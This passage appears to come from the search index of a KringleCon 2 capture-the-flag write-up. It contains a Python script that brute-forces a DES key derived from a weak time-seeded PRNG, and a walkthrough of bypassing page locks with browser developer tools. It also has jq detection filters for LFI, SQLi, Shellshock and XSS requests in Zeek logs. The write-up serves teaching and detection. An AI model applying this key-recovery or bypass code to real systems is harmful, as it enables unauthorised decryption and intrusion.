pdfoutfile = 'ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf' # Friday, December 6, 2019 7:00:00 PM start = 1575658800 # Loop over 2 hours and generate the key for each for x in range(7200): keyseed = start + x key = generate_key(keyseed) bytekey = bytearray.fromhex(key) # Prep for decrypting DES-CBC cipher = DES.new( bytekey, DES.MODE_CBC, iv=bytearray.fromhex('0000000000000000') ) # Read encrypted file f = open(encinfile, 'rb') encrypted = f.read() # Decrypt using the current key msg = (cipher.iv + cipher.decrypt(encrypted)) # Check if decryption was successful if msg[9:12] == b'PDF': # Yes, we got a PDF! print(f'Pass {x}: {key} decrypts to a PDF!') f = open(pdfoutfile, 'wb') f.write(msg) break else: # Womp womp! On to the next. print(f'Pass {x}: {key} is no bueno!') All 7200 possible seeds are used to generate the associated keys. Each key is then used to decrypt the file and if the decrypted file header indicates it's a PDF file we know the decryption was successful, in which case we break out of the loop. The correct key is found on attempt 4850 which tells us the file was encrypted on Friday, December 6, 2019 8:20:50 PM. Sweet! Super Sled-O-Matic quick-start guide v1.2 successfully decrypted! Someone needs to have a serious talk with Santa and explain to him that ElfScrow version 1.01 is in urgent need of an update though. Way too much DES and PRNG shenanigans and I'd have some serious reservations slapping my name on the whole 'the only encryption trusted by Santa!' tagline if I were him. Answer # Middle line on the cover page: Machine Learning Sleigh Route Finder Hint # None","title":"Recover Cleartext Document"},{"location":"challenges/c10/#recover-cleartext-document","text":"Hint : Holly Evergreen - Mongo Pilfer","title":"Recover Cleartext Document"},{"location":"challenges/c10/#request","text":"The Elfscrow Crypto tool is a vital asset used at Elf University for encrypting SUPER SECRET documents. We can't send you the source, but we do have debug symbols that you can use. Recover the plaintext content for this encrypted document . We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC. What is the middle line on the cover page? (Hint: it's five words)","title":"Request"},{"location":"challenges/c10/#resources","text":"Elfscrow Crypto Binary Elfscrow Debug Symbols Encrypted PDF Document Ron Bowes, Reversing Crypto the Easy Way Reversing Crypto Demo Code & Slides IDA Ghidra","title":"Resources"},{"location":"challenges/c10/#solution","text":"The most helpful resource for this challenge is defnitely Ron Bowes' Reversing Crypto the Easy Way presentation. It goes over a lot of information and is well worth the time. If you're new to crypto then you'll definitely learn more than a few things (like I did). Start by encrypting a plain text document with the elfscrow.exe crypto tool and looking at the program output. elfscrow.exe --encrypt test.txt test.txt.enc The elfscrow.exe application prints the seed, generates and prints the encryption key, encrypts the file, sends the key to the elfscrow server for storage, and finally prints a secret ID which can be used to retrieve the key from the server and decrypt the file again. The output provides two additional pieces of information. First, the seed value looks like the current date and time represented in epoch format . Secondly, the key length is 8 bytes which could indicate DES. Open up the elfscrow.exe binary and elfscrow.pdb debug symbols in IDA to better understand how exactly the tool uses the seed to generate the 8-byte encryption key and what algorithm is being used. Start by looking at the generate_key function. This function first calls time , then super_secure_srand to initialize the seed, and finally loops 8 times over the super_secure_random pseudo-random number generator (PRNG) function to create the 8-byte encryption key. The super_secure_srand function doesn't to do much more than print and then store the seed in state . The super_secure_random function then takes the seed value stored in state , multiplies it by 343FDh (i.e. 214013 in decimal), adds 269EC3h (i.e. 2531011 in decimal), and saves this value in state as the new seed value. It continues with bit-shifting the current value, bitwise AND-ing with 7FFFh (i.e. 32767 in decimal), and returning this value as the next key byte. Translating super_secure_random into Python gives us the below function. def rand(): \"\"\"Generate random value.\"\"\" # 1. get seed value # 2. multiply seed by 214013 # 3. add 2531011 (this is our new seed value) # 4. right shift seed by 16 # 5. bitwise AND with 32767 global seed seed = (214013 * seed + 2531011) val = seed >> 16 return (val & 32767) Doing the same for the generate_key function results in the following function. def generate_key(val): \"\"\"Generate encryption key.\"\"\" global seed seed = val encrypted = [] for _x in range(8): tmp = hex(rand()) if len(str(tmp)) == 6: encrypted.append(str(tmp)[4:]) elif len(str(tmp)) == 5: encrypted.append(str(tmp)[3:]) elif len(str(tmp)) == 4: encrypted.append(str(tmp)[2:]) elif len(str(tmp)) == 3: encrypted.append(f\"0{str(tmp)[-1]}\") return ''.join(encrypted) Now that we've determined the initial seed value (i.e. epoch time) and replicated the algorithm to generate the 8-byte key, we need to determine what encryption algorithm is used by elfscrow.exe . The do_encrypt function provides some useful hints. First there's the obvious \"CryptImportKey failed for DES-CBC key\" comment. While a comment can contain incorrect information it's confirmed by the 6601h algorithm ID value (i.e. CALG_DES) which is used as input for the CryptImportKey function. Our initial suspicion that DES is being used based on the 8-byte key length appears to be correct. The final piece of the puzzle is the hint that the file was encrypted on December 6, 2019, between 7pm and 9pm UTC. This gives us a 7200-second window or 7200 possible seed values starting from 1575658800 (i.e. epoch time for December 6, 2019, 7pm). We can now complete the decrypt_pdf.py script by adding the following Python code. def main(): \"\"\"Execute.\"\"\" # File names encinfile = 'ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc' pdfoutfile = 'ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf' # Friday, December 6, 2019 7:00:00 PM start = 1575658800 # Loop over 2 hours and generate the key for each for x in range(7200): keyseed = start + x key = generate_key(keyseed) bytekey = bytearray.fromhex(key) # Prep for decrypting DES-CBC cipher = DES.new( bytekey, DES.MODE_CBC, iv=bytearray.fromhex('0000000000000000') ) # Read encrypted file f = open(encinfile, 'rb') encrypted = f.read() # Decrypt using the current key msg = (cipher.iv + cipher.decrypt(encrypted)) # Check if decryption was successful if msg[9:12] == b'PDF': # Yes, we got a PDF! print(f'Pass {x}: {key} decrypts to a PDF!') f = open(pdfoutfile, 'wb') f.write(msg) break else: # Womp womp! On to the next. print(f'Pass {x}: {key} is no bueno!') All 7200 possible seeds are used to generate the associated keys. Each key is then used to decrypt the file and if the decrypted file header indicates it's a PDF file we know the decryption was successful, in which case we break out of the loop. The correct key is found on attempt 4850 which tells us the file was encrypted on Friday, December 6, 2019 8:20:50 PM. Sweet! Super Sled-O-Matic quick-start guide v1.2 successfully decrypted! Someone needs to have a serious talk with Santa and explain to him that ElfScrow version 1.01 is in urgent need of an update though. Way too much DES and PRNG shenanigans and I'd have some serious reservations slapping my name on the whole 'the only encryption trusted by Santa!' tagline if I were him.","title":"Solution"},{"location":"challenges/c10/#answer","text":"Middle line on the cover page: Machine Learning Sleigh Route Finder","title":"Answer"},{"location":"challenges/c10/#hint","text":"None","title":"Hint"},{"location":"challenges/c11/","text":"Open the Sleigh Shop Door # Hint : Kent Tinseltooth - Smart Braces Request # Psst - hey! I'm Shinny Upatree, and I know what's going on! Yeah, that's right - guarding the sleigh shop has made me privvy to some serious, high-level intel. In fact, I know WHO is causing all the trouble. Cindy? Oh no no, not that who. And stop guessing - you'll never figure it out. The only way you could would be if you could break into my crate , here. You see, I've written the villain's name down on a piece of paper and hidden it away securely! Resources # Crate Chrome Developer Tools Firefox Developer Tools Safari Developer Tools Edge Developer Tools cURL Man Page Solution # Time to whip out those browser developer tools and pick some HTML locks. Kent gives you a bunch of hints covering developer tools for just about every mainstream browser out there so you should be good. Unless you're a Lynx user . Anyway, we need to bypass 10 of these bad boys which honestly feels like a little overkill for a crate that 'only' contains a piece of paper with a villain's name written on it. What other secrets are you hiding in that crate, Shinny? Lock 1 # Riddle : You don't need a clever riddle to open the console and scroll a little. Starting off nice and slow. Open the developer tools, go to the JavaScript console and scroll up. Quick sidenote, the lock codes are dynamically generated and, except for 1 or 2 exceptions, will most likely not be the same as the ones you will find when solving this challenge. The final goal is accessing the crate though and not the codes themselves. Answer : 79183M9B Lock 2 # Riddle : Some codes are hard to spy, perhaps they'll show up on pulp with dye? The strong tags inside the libra class are hidden via display: none but the code is visible in the HTML. Answer : UIZZC74T Lock 3 # Riddle : This code is still unknown; it was fetched but never shown. The code can be found in an image resource that was downloaded but not displayed on the page. Answer : 529P8GYF Lock 4 # Riddle : Where might we keep the things we forage? Yes, of course: Local barrels! The code's in the local storage section of the developer tools. Answer : V6K7BU0L Lock 5 # Riddle : Did you notice the code in the title? It may very well prove vital. You'll find the code all the way to the right inside the title tags in the HTML header. Answer : A6YICRGB Lock 6 # Riddle : In order for this hologram to be effective, it may be necessary to increase your perspective. Disable the perspective CSS property on the hologram class to reveal the code inside the hologram image. Answer : EBQQ4A47 Lock 7 # Riddle : The font you're seeing is pretty slick, but this lock's code was my first pick. Back to the title tags where the code is stored as a value of a font-family CSS property. Answer : IC9WA4PC Lock 8 # Riddle : In the event that the .eggs go bad, you must figure out who will be sad. The spoil event listener on the eggs class leads to a JavaScript function with the code. Answer : VERONICA Lock 9 # Riddle : This next code will be unredacted, but only when all the chakras are :active. Select each chakra class and set it to active to reveal the code in between the riddle text. Answer : Y5EI2NGT Lock 10 # Riddle : Oh, no! This lock's out of commission! Pop off the cover and locate what's missing. Unlike the previous 9 locks this one requires a little more work to solve. Start by dragging the cover div outside of the lock to uncover, pun intended, the circuitry. Removing the cover class from the div works as well but the drag option results in a cooler visual. In the bottom right hand corner, vertically, and in small print you'll find KD29XJ37 . Try entering the code and be greeted with an error in the JavaScript console, stating 'Error: Missing Macaroni!'. The problem is there's three different components, macaroni being one of them, missing inside the lock div. Taking the long route, deobfuscate the JavaScript code to better understand what exactly it's trying to check inside of that try/catch block. One option is to use the developer tools JavaScript console to evaluate small pieces of the code. For example, entering _0x3170('0x56') in the console will print \"Missing macaroni!\". Rinse and repeat until the code becomes more readable. try { const _0xc468b6 = document[\"querySelector\"](\".locks > li > .lock.c10 > .component.macaroni\"); if (!_0xc468b6) throw Error(\"Missing macaroni!\"); _0xc468b6[\"attributes\"][\"data-code\"][\"value\"]; const _0x554445 = document[\"querySelector\"](\".locks > li > .lock.c10 > .component.swab\"); if (!_0x554445) throw Error(\"Missing cotton swab!\"); _0x554445[\"attributes\"][\"data-code\"][\"value\"]; const _0xd33ab7 = document[\"querySelector\"](\".locks > li > .lock.c10 > .component.gnome\"); if (!_0xd33ab7) throw Error(\"Missing gnome!\"); _0xd33ab7[\"attributes\"][\"data-code\"][\"value\"]; _0x39cbd(_0x47427d, { \"id\": _0x47427d, \"code\": _0x13fc35[\"value\"] }); } catch (_0x262527) { console[\"error\"](_0x262527); } It appears that the three components, defined as CSS classes, we're missing on this lock are macaroni , swab , and gnome . You will find 3 divs containing each of the required classes spread around the DOM. Fix things by dragging all of them inside of the lock div and you'll be able to open this final lock using the code KD29XJ37 . Alternatively you can replace the cover class with component macaroni swab gnome and add a data-code parameter with a random value to the same div, but like before you'll miss out on some funny visuals. Once all 10 locks have been opened the page displays Shinny Upatree's note. Answer # Villain's name : The Tooth Fairy Hint # Wha - what?? You got into my crate?! Well that's embarrassing... But you know what? Hmm... If you're good enough to crack MY security... Do you think you could bring this all to a grand conclusion? Please go into the sleigh shop and see if you can finish this off! Stop the Tooth Fairy from ruining Santa's sleigh route!","title":"Open the Sleigh Shop Door"},{"location":"challenges/c11/#open-the-sleigh-shop-door","text":"Hint : Kent Tinseltooth - Smart Braces","title":"Open the Sleigh Shop Door"},{"location":"challenges/c11/#request","text":"Psst - hey! I'm Shinny Upatree, and I know what's going on! Yeah, that's right - guarding the sleigh shop has made me privvy to some serious, high-level intel. In fact, I know WHO is causing all the trouble. Cindy? Oh no no, not that who. And stop guessing - you'll never figure it out. The only way you could would be if you could break into my crate , here. You see, I've written the villain's name down on a piece of paper and hidden it away securely!","title":"Request"},{"location":"challenges/c11/#resources","text":"Crate Chrome Developer Tools Firefox Developer Tools Safari Developer Tools Edge Developer Tools cURL Man Page","title":"Resources"},{"location":"challenges/c11/#solution","text":"Time to whip out those browser developer tools and pick some HTML locks. Kent gives you a bunch of hints covering developer tools for just about every mainstream browser out there so you should be good. Unless you're a Lynx user . Anyway, we need to bypass 10 of these bad boys which honestly feels like a little overkill for a crate that 'only' contains a piece of paper with a villain's name written on it. What other secrets are you hiding in that crate, Shinny?","title":"Solution"},{"location":"challenges/c11/#lock-1","text":"Riddle : You don't need a clever riddle to open the console and scroll a little. Starting off nice and slow. Open the developer tools, go to the JavaScript console and scroll up. Quick sidenote, the lock codes are dynamically generated and, except for 1 or 2 exceptions, will most likely not be the same as the ones you will find when solving this challenge. The final goal is accessing the crate though and not the codes themselves. Answer : 79183M9B","title":"Lock 1"},{"location":"challenges/c11/#lock-2","text":"Riddle : Some codes are hard to spy, perhaps they'll show up on pulp with dye? The strong tags inside the libra class are hidden via display: none but the code is visible in the HTML. Answer : UIZZC74T","title":"Lock 2"},{"location":"challenges/c11/#lock-3","text":"Riddle : This code is still unknown; it was fetched but never shown. The code can be found in an image resource that was downloaded but not displayed on the page. Answer : 529P8GYF","title":"Lock 3"},{"location":"challenges/c11/#lock-4","text":"Riddle : Where might we keep the things we forage? Yes, of course: Local barrels! The code's in the local storage section of the developer tools. Answer : V6K7BU0L","title":"Lock 4"},{"location":"challenges/c11/#lock-5","text":"Riddle : Did you notice the code in the title? It may very well prove vital. You'll find the code all the way to the right inside the title tags in the HTML header. Answer : A6YICRGB","title":"Lock 5"},{"location":"challenges/c11/#lock-6","text":"Riddle : In order for this hologram to be effective, it may be necessary to increase your perspective. Disable the perspective CSS property on the hologram class to reveal the code inside the hologram image. Answer : EBQQ4A47","title":"Lock 6"},{"location":"challenges/c11/#lock-7","text":"Riddle : The font you're seeing is pretty slick, but this lock's code was my first pick. Back to the title tags where the code is stored as a value of a font-family CSS property. Answer : IC9WA4PC","title":"Lock 7"},{"location":"challenges/c11/#lock-8","text":"Riddle : In the event that the .eggs go bad, you must figure out who will be sad. The spoil event listener on the eggs class leads to a JavaScript function with the code. Answer : VERONICA","title":"Lock 8"},{"location":"challenges/c11/#lock-9","text":"Riddle : This next code will be unredacted, but only when all the chakras are :active. Select each chakra class and set it to active to reveal the code in between the riddle text. Answer : Y5EI2NGT","title":"Lock 9"},{"location":"challenges/c11/#lock-10","text":"Riddle : Oh, no! This lock's out of commission! Pop off the cover and locate what's missing. Unlike the previous 9 locks this one requires a little more work to solve. Start by dragging the cover div outside of the lock to uncover, pun intended, the circuitry. Removing the cover class from the div works as well but the drag option results in a cooler visual. In the bottom right hand corner, vertically, and in small print you'll find KD29XJ37 . Try entering the code and be greeted with an error in the JavaScript console, stating 'Error: Missing Macaroni!'. The problem is there's three different components, macaroni being one of them, missing inside the lock div. Taking the long route, deobfuscate the JavaScript code to better understand what exactly it's trying to check inside of that try/catch block. One option is to use the developer tools JavaScript console to evaluate small pieces of the code. For example, entering _0x3170('0x56') in the console will print \"Missing macaroni!\". Rinse and repeat until the code becomes more readable. try { const _0xc468b6 = document[\"querySelector\"](\".locks > li > .lock.c10 > .component.macaroni\"); if (!_0xc468b6) throw Error(\"Missing macaroni!\"); _0xc468b6[\"attributes\"][\"data-code\"][\"value\"]; const _0x554445 = document[\"querySelector\"](\".locks > li > .lock.c10 > .component.swab\"); if (!_0x554445) throw Error(\"Missing cotton swab!\"); _0x554445[\"attributes\"][\"data-code\"][\"value\"]; const _0xd33ab7 = document[\"querySelector\"](\".locks > li > .lock.c10 > .component.gnome\"); if (!_0xd33ab7) throw Error(\"Missing gnome!\"); _0xd33ab7[\"attributes\"][\"data-code\"][\"value\"]; _0x39cbd(_0x47427d, { \"id\": _0x47427d, \"code\": _0x13fc35[\"value\"] }); } catch (_0x262527) { console[\"error\"](_0x262527); } It appears that the three components, defined as CSS classes, we're missing on this lock are macaroni , swab , and gnome . You will find 3 divs containing each of the required classes spread around the DOM. Fix things by dragging all of them inside of the lock div and you'll be able to open this final lock using the code KD29XJ37 . Alternatively you can replace the cover class with component macaroni swab gnome and add a data-code parameter with a random value to the same div, but like before you'll miss out on some funny visuals. Once all 10 locks have been opened the page displays Shinny Upatree's note.","title":"Lock 10"},{"location":"challenges/c11/#answer","text":"Villain's name : The Tooth Fairy","title":"Answer"},{"location":"challenges/c11/#hint","text":"Wha - what?? You got into my crate?! Well that's embarrassing... But you know what? Hmm... If you're good enough to crack MY security... Do you think you could bring this all to a grand conclusion? Please go into the sleigh shop and see if you can finish this off! Stop the Tooth Fairy from ruining Santa's sleigh route!","title":"Hint"},{"location":"challenges/c12/","text":"Filter Out Poisoned Data Sources # Hint : Wunorse Openslae - Zeek JSON Analysis Request # Use the data supplied in the Zeek JSON logs to identify the IP addresses of attackers poisoning Santa's flight mapping software. Block the 100 offending sources of information to guide Santa's sleigh through the attack. Submit the Route ID (\"RID\") success value that you're given. For hints on achieving this objective, please visit the Sleigh Shop and talk with Wunorse Openslae. Resources # Zeek JSON logs Parsing Zeek JSON Logs with JQ Sleigh Route Finder API Local File Inclusion (LFI) Cross-Site Scripting (XSS) SQL Injection (SQLi) ShellShock Solution # Before diving into the Zeek JSON logs and finding all the bad activity we first need log in to the Sleigh Route Finder API website. The Super Sled-O-Matic quick-start guide provides information on where we can find the login credentials, stating \"The default login credentials should be changed on startup and can be found in the readme in the ElfU Research Labs git repository.\" Git readme files are typically named README.md so search the logs for that particular string. cat http.log | jq '.[] | select(.uri|test(\"README\")) | select(.status_code==200)' Download README.md . The default admin credentials are admin 924158F9522B3744F5FCD4D10FAC4356 . Now that we have access to the Sleigh Route Finder API we can start going through the logs to find all the IP addresses responsible for the bad activity. Wunorse tells us we might want to look for LFI , XSS , SQLi , and Shellshock . Remember to search more than just the uri field for these exploits. host , user_agent , and username can also contain interesting artifacts. Let's kick things off with Local File Inclusion (LFI) . To keep things clean the output is limited to just the source IP and the field being searched. jq -j '.[] | select(.uri|contains(\"../\")) | .\"id.orig_h\", \"\\t\", .uri, \"\\n\"' http.log jq -j '.[] | select(.uri|test(\".*=.*passwd.*\")) | .\"id.orig_h\", \"\\t\", .uri, \"\\n\"' http.log We have our first set of 11 bad IPs. Moving on to SQL Injection (SQLi) . jq -j '.[] | select(.uri|contains(\"UNION\")) | .\"id.orig_h\", \"\\t\", .uri, \"\\n\"' http.log jq -j '.[] | select(.user_agent|contains(\"UNION\")) | .\"id.orig_h\", \"\\t\", .user_agent, \"\\n\"' http.log jq -j '.[] | select(.username|contains(\"1=1\")) | .\"id.orig_h\", \"\\t\", .username, \"\\n\"' http.log 29 results. Quite the haul! Next up, Shellshock . jq -j '.[] | select(.user_agent|contains(\":;\")) | .\"id.orig_h\", \"\\t\", .user_agent, \"\\n\"' http.log 6 additional IPs. Last but not least, Cross-Site Scripting (XSS) . jq -j '.[] | select(.host|contains(\"<\")) | .\"id.orig_h\", \"\\t\", .host, \"\\n\"' http.log jq -j '.[] | select(.uri|contains(\"<\")) | .\"id.orig_h\", \"\\t\", .uri, \"\\n\"' http.log With the XSS results we now have a total of 62 IP addresses. Not enough to cover all of the malicious traffic unfortunately. To find more IPs we need to use information from the current set and match those with other, less obvious log entries. Take a look at the User-Agent strings for the IP addresses we found so far. cat IPs_bad.csv | cut -d$'\\t' -f 1,5 | grep -vEi '.*UNION|:;.*' While not all of these jump out as suspicious, a few definitely do. The below Python script takes 2 CSV files with id.orig_h , host , username , uri , and user_agent fields from the Zeek logs as input. One log containing only the clearly bad IPs and the other containing all of them. If we find more than 3 matches for a specific IP address (i.e. more than 2 additional values) then chances are we're including legitimate traffic so we ignore those just to be on the safe side. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Filter Out Poisoned Data Sources Challenge.\"\"\" def main(): \"\"\"Execute.\"\"\" file_bad = 'IPs_bad.csv' file_all = 'IPs_all.csv' list_bad = [] list_all = [] # Read the full data log with open(file_all) as fp: line = fp.readline() while line: list_all.append(line.split('\\t')) line = fp.readline() # Read the bad IP data and match on user_agent but only # keep the results if less than 4 matches are found. with open(file_bad) as fp: line = fp.readline() while line: tmp = [] line_bad = line.split('\\t') for line_all in list_all: if line_all[4] == line_bad[4]: tmp.append(line_all[0]) # Only add if less than 4 matches if len(tmp) < 4: list_bad.extend(tmp) # Add the original IP as well list_bad.append(line_bad[0]) line = fp.readline() # Remove duplicates list_bad = list(dict.fromkeys(list_bad)) # Tadaaaaa! print(f'Found {len(list_bad)} IPs: {\",\".join(list_bad)}') if __name__ == \"__main__\": main() We only have 97 IPs, but let's give it a shot anyway. Take the CSV data and deny it on the SRF firewall . The RID seems to be made up of 2 dates, 08-07-1985 and 08-26-1964, but I'm not sure what they signify. Enter the Bell Tower and meet up with Santa, Krampus, and the Tooth Fairy. In the top left corner you'll also find a final note . Roll credits! Answer # RID: 0807198508261964 Hint # Krampus: Congratulations on a job well done! Oh, by the way, I won the Frido Sleigh contest. I got 31.8% of the prizes, though I'll have to figure that out. Santa: You did it! Thank you! You uncovered the sinister plot to destroy the holiday season! Through your diligent efforts, we\u2019ve brought the Tooth Fairy to justice and saved the holidays! Ho Ho Ho! The more I laugh, the more I fill with glee. And the more the glee, The more I'm a merrier me! Merry Christmas and Happy Holidays. The Tooth Fairy: You foiled my dastardly plan! I\u2019m ruined! And I would have gotten away with it too, if it weren't for you meddling kids!","title":"Filter Out Poisoned Data Sources"},{"location":"challenges/c12/#filter-out-poisoned-data-sources","text":"Hint : Wunorse Openslae - Zeek JSON Analysis","title":"Filter Out Poisoned Data Sources"},{"location":"challenges/c12/#request","text":"Use the data supplied in the Zeek JSON logs to identify the IP addresses of attackers poisoning Santa's flight mapping software. Block the 100 offending sources of information to guide Santa's sleigh through the attack. Submit the Route ID (\"RID\") success value that you're given. For hints on achieving this objective, please visit the Sleigh Shop and talk with Wunorse Openslae.","title":"Request"},{"location":"challenges/c12/#resources","text":"Zeek JSON logs Parsing Zeek JSON Logs with JQ Sleigh Route Finder API Local File Inclusion (LFI) Cross-Site Scripting (XSS) SQL Injection (SQLi) ShellShock","title":"Resources"},{"location":"challenges/c12/#solution","text":"Before diving into the Zeek JSON logs and finding all the bad activity we first need log in to the Sleigh Route Finder API website. The Super Sled-O-Matic quick-start guide provides information on where we can find the login credentials, stating \"The default login credentials should be changed on startup and can be found in the readme in the ElfU Research Labs git repository.\" Git readme files are typically named README.md so search the logs for that particular string. cat http.log | jq '.[] | select(.uri|test(\"README\")) | select(.status_code==200)' Download README.md . The default admin credentials are admin 924158F9522B3744F5FCD4D10FAC4356 . Now that we have access to the Sleigh Route Finder API we can start going through the logs to find all the IP addresses responsible for the bad activity. Wunorse tells us we might want to look for LFI , XSS , SQLi , and Shellshock . Remember to search more than just the uri field for these exploits. host , user_agent , and username can also contain interesting artifacts. Let's kick things off with Local File Inclusion (LFI) . To keep things clean the output is limited to just the source IP and the field being searched. jq -j '.[] | select(.uri|contains(\"../\")) | .\"id.orig_h\", \"\\t\", .uri, \"\\n\"' http.log jq -j '.[] | select(.uri|test(\".*=.*passwd.*\")) | .\"id.orig_h\", \"\\t\", .uri, \"\\n\"' http.log We have our first set of 11 bad IPs. Moving on to SQL Injection (SQLi) . jq -j '.[] | select(.uri|contains(\"UNION\")) | .\"id.orig_h\", \"\\t\", .uri, \"\\n\"' http.log jq -j '.[] | select(.user_agent|contains(\"UNION\")) | .\"id.orig_h\", \"\\t\", .user_agent, \"\\n\"' http.log jq -j '.[] | select(.username|contains(\"1=1\")) | .\"id.orig_h\", \"\\t\", .username, \"\\n\"' http.log 29 results. Quite the haul! Next up, Shellshock . jq -j '.[] | select(.user_agent|contains(\":;\")) | .\"id.orig_h\", \"\\t\", .user_agent, \"\\n\"' http.log 6 additional IPs. Last but not least, Cross-Site Scripting (XSS) . jq -j '.[] | select(.host|contains(\"<\")) | .\"id.orig_h\", \"\\t\", .host, \"\\n\"' http.log jq -j '.[] | select(.uri|contains(\"<\")) | .\"id.orig_h\", \"\\t\", .uri, \"\\n\"' http.log With the XSS results we now have a total of 62 IP addresses. Not enough to cover all of the malicious traffic unfortunately. To find more IPs we need to use information from the current set and match those with other, less obvious log entries. Take a look at the User-Agent strings for the IP addresses we found so far. cat IPs_bad.csv | cut -d$'\\t' -f 1,5 | grep -vEi '.*UNION|:;.*' While not all of these jump out as suspicious, a few definitely do. The below Python script takes 2 CSV files with id.orig_h , host , username , uri , and user_agent fields from the Zeek logs as input. One log containing only the clearly bad IPs and the other containing all of them. If we find more than 3 matches for a specific IP address (i.e. more than 2 additional values) then chances are we're including legitimate traffic so we ignore those just to be on the safe side. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Filter Out Poisoned Data Sources Challenge.\"\"\" def main(): \"\"\"Execute.\"\"\" file_bad = 'IPs_bad.csv' file_all = 'IPs_all.csv' list_bad = [] list_all = [] # Read the full data log with open(file_all) as fp: line = fp.readline() while line: list_all.append(line.split('\\t')) line = fp.readline() # Read the bad IP data and match on user_agent but only # keep the results if less than 4 matches are found. with open(file_bad) as fp: line = fp.readline() while line: tmp = [] line_bad = line.split('\\t') for line_all in list_all: if line_all[4] == line_bad[4]: tmp.append(line_all[0]) # Only add if less than 4 matches if len(tmp) < 4: list_bad.extend(tmp) # Add the original IP as well list_bad.append(line_bad[0]) line = fp.readline() # Remove duplicates list_bad = list(dict.fromkeys(list_bad)) # Tadaaaaa! print(f'Found {len(list_bad)} IPs: {\",\".join(list_bad)}') if __name__ == \"__main__\": main() We only have 97 IPs, but let's give it a shot anyway. Take the CSV data and deny it on the SRF firewall . The RID seems to be made up of 2 dates, 08-07-1985 and 08-26-1964, but I'm not sure what they signify. Enter the Bell Tower and meet up with Santa, Krampus, and the Tooth Fairy. In the top left corner you'll also find a final note . Roll credits!","title":"Solution"},{"location":"challenges/c12/#answer","text":"RID: 0807198508261964","title":"Answer"},{"location":"challenges/c12/#hint","text":"Krampus: Congratulations on a job well done! Oh, by the way, I won the Frido Sleigh contest. I got 31.8% of the prizes, though I'll have to figure that out. Santa: You did it! Thank you! You uncovered the sinister plot to destroy the holiday season! Through your diligent efforts, we\u2019ve brought the Tooth Fairy to justice and saved the holidays! Ho Ho Ho! The more I laugh, the more I fill with glee. And the more the glee, The more I'm a merrier me! Merry Christmas and Happy Holidays. The Tooth Fairy: You foiled my dastardly plan! I\u2019m ruined! And I would have gotten away with it too, if it weren't for you meddling kids!","title":"Hint"},{"location":"challenges/c2/","text":"Unredact Threatening Document # Hint : none Request # Someone sent a threatening letter to Elf University. What is the first word in ALL CAPS in the subject line of the letter? Please find the letter in the Quad. Resources # Threatening letter Solution # The letter can be found in the top left corner of the Quad, sticking out from behind a tree. Open LetterToElfUPersonnel.pdf and select all text. Copy the selection and paste it into a new plaintext document. Date: February 28, 2019 To the Administration, Faculty, and Staff of Elf University 17 Christmas Tree Lane North Pole From: A Concerned and Aggrieved Character Subject: DEMAND: Spread Holiday Cheer to Other Holidays and Mythical Characters... OR ELSE! Attention All Elf University Personnel, It remains a constant source of frustration that Elf University and the entire operation at the North Pole focuses exclusively on Mr. S. Claus and his year-end holiday spree. We URGE you to consider lending your considerable resources and expertise in providing merriment, cheer, toys, candy, and much more to other holidays year-round, as well as to other mythical characters. For centuries, we have expressed our frustration at your lack of willingness to spread your cheer beyond the inaptly-called \u201cHoliday Season.\u201d There are many other perfectly fine holidays and mythical characters that need your direct support year-round. If you do not accede to our demands, we will be forced to take matters into our own hands. We do not make this threat lightly. You have less than six months to act demonstrably. Sincerely, --A Concerned and Aggrieved Character 'DEMAND' is the first word in ALL CAPS in the subject line of the threatening letter. I do wonder about that date though. Was it really sent on February 28, 2019? Who redacted it? How long has it been lying behind a tree in a corner of the quad like that? Did no one notice it being there? Did no one care? What is the air-speed velocity of an unladen swallow? Answer # Word: DEMAND Hint # None","title":"Unredact Threatening Document"},{"location":"challenges/c2/#unredact-threatening-document","text":"Hint : none","title":"Unredact Threatening Document"},{"location":"challenges/c2/#request","text":"Someone sent a threatening letter to Elf University. What is the first word in ALL CAPS in the subject line of the letter? Please find the letter in the Quad.","title":"Request"},{"location":"challenges/c2/#resources","text":"Threatening letter","title":"Resources"},{"location":"challenges/c2/#solution","text":"The letter can be found in the top left corner of the Quad, sticking out from behind a tree. Open LetterToElfUPersonnel.pdf and select all text. Copy the selection and paste it into a new plaintext document. Date: February 28, 2019 To the Administration, Faculty, and Staff of Elf University 17 Christmas Tree Lane North Pole From: A Concerned and Aggrieved Character Subject: DEMAND: Spread Holiday Cheer to Other Holidays and Mythical Characters... OR ELSE! Attention All Elf University Personnel, It remains a constant source of frustration that Elf University and the entire operation at the North Pole focuses exclusively on Mr. S. Claus and his year-end holiday spree. We URGE you to consider lending your considerable resources and expertise in providing merriment, cheer, toys, candy, and much more to other holidays year-round, as well as to other mythical characters. For centuries, we have expressed our frustration at your lack of willingness to spread your cheer beyond the inaptly-called \u201cHoliday Season.\u201d There are many other perfectly fine holidays and mythical characters that need your direct support year-round. If you do not accede to our demands, we will be forced to take matters into our own hands. We do not make this threat lightly. You have less than six months to act demonstrably. Sincerely, --A Concerned and Aggrieved Character 'DEMAND' is the first word in ALL CAPS in the subject line of the threatening letter. I do wonder about that date though. Was it really sent on February 28, 2019? Who redacted it? How long has it been lying behind a tree in a corner of the quad like that? Did no one notice it being there? Did no one care? What is the air-speed velocity of an unladen swallow?","title":"Solution"},{"location":"challenges/c2/#answer","text":"Word: DEMAND","title":"Answer"},{"location":"challenges/c2/#hint","text":"None","title":"Hint"},{"location":"challenges/c3/","text":"Evaluate Attack Outcome # Hint : Bushy Evergreen - Escape Ed Request # We're seeing attacks against the Elf U domain! Using the event log data , identify the user account that the attacker compromised using a password spray attack. Bushy Evergreen is hanging out in the train station and may be able to help you out. Resources # Event log data DeepBlueCLI Github DeepBlueCLI: a PowerShell Module for Hunt Teaming via Windows Event Logs Solution # Start by cloning or downloading the DeepBlueCLI Git repository. During a password spray attack the attacker tries the same password across a number of different accounts. When the security event log contains a high number of logon failures in combination with a succesful logon for the same account the attack was likely successful. Run DeepBlue.ps1 against the provided log file. .\\DeepBlue.ps1 ..\\Security.evtx | Sort-Object -Property Date | Format-List DeepBlueCLI finds evidence of the password spray attack and provides a list of 31 targeted usernames but the output is a little hard to digest. Run DeepBlue.ps1 again, this time formatting the output as a table to make things a little easier to read. .\\DeepBlue.ps1 ..\\Security.evtx | Format-Table Message,Results Out of the three accounts that had successful logons supatree is the only one that's also showing up in the list of 